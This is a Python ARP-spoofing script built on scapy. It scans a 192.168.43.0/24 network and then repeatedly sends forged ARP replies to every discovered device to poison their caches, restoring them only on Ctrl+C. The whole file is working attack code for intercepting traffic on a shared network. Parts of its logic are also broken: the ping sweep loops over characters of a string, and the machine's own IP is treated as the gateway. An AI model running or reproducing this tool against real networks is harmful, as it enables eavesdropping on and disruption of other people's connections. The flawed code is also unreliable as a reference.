#!/usr/bin/env python
import os

import scapy.all as scapy
import time
import sys
import socket

class Spoofer:
    def __init__(self):
        self.devices = []

    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        answered_list = scapy.srp(broadcast / arp_request, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc if answered_list else None

    def scan_network(self, ip_range):
        arp_request = scapy.ARP(pdst=ip_range)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        answered_list = scapy.srp(broadcast / arp_request, timeout=1, verbose=False)[0]

        for element in answered_list:
            self.devices.append({'ip': element[1].psrc, 'mac': element[1].hwsrc})

    def spoof_all(self, local_ip):
        local_mac = self.get_mac(local_ip)
        if not local_mac:
            print("[-] Could not get the local MAC address.")
            return

        for device in self.devices:
            # Send an ARP request first to populate the ARP cache
            target_mac = self.get_mac(device['ip'])
            if not target_mac:
                print(f"[-] Could not resolve MAC for {device['ip']}. Skipping.")
                continue

            # Send ARP reply to target device, spoofing our IP as the local gateway
            packet = scapy.Ether(dst=target_mac) / scapy.ARP(
                op=2,  # ARP response ("is-at")
                pdst=device['ip'],  # Target IP
                hwdst=target_mac,  # Target MAC
                psrc=local_ip  # Spoofed source IP (e.g., gateway IP)
            )
            scapy.send(packet, verbose=False)

            # Send ARP reply to the gateway, spoofing our IP as the target device
            reverse_packet = scapy.Ether(dst=local_mac) / scapy.ARP(
                op=2,  # ARP response ("is-at")
                pdst=local_ip,  # Local IP (gateway IP in most cases)
                hwdst=local_mac,  # Local MAC (gateway MAC)
                psrc=device['ip']  # Spoofed source IP (target device IP)
            )
            scapy.send(reverse_packet, verbose=False)

    def restore(self, local_ip):
        local_mac = self.get_mac(local_ip)
        for device in self.devices:
            device_mac = device['mac']
            scapy.send(scapy.ARP(op=2, pdst=device['ip'], hwdst=device_mac, psrc=local_ip, hwsrc=local_mac), count=4, verbose=False)
            scapy.send(scapy.ARP(op=2, pdst=local_ip, hwdst=local_mac, psrc=device['ip'], hwsrc=device_mac), count=4, verbose=False)

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))  # 對外連接獲取本機 IP
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

def ping_scan(ip_range):
    active_devices = []
    for ip in ip_range:
        response = os.system(f"ping -n 1 {ip} >nul")
        # 對於 Windows 用戶，使用：response = os.system(f"ping -n 1 {ip} >nul")
        if response == 0:
            active_devices.append(ip)
    return active_devices

if __name__ == '__main__':
    ip_range = "192.168.43.0/24"
    print(ping_scan(ip_range))
    local_ip = get_local_ip()
    print(f"[+] Detected local IP: {local_ip}")

    spoofer = Spoofer()
    spoofer.scan_network(ip_range)

    if not spoofer.devices:
        print("[-] No devices found in the network.")
        sys.exit(0)

    try:
        print("[+] Starting ARP spoof on all devices...")
        while True:
            spoofer.spoof_all(local_ip)
            print("[+] Packets sent")
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C ... Restoring ARP tables...")
        spoofer.restore(local_ip)
        print("[+] ARP tables restored.")
        sys.exit(0)
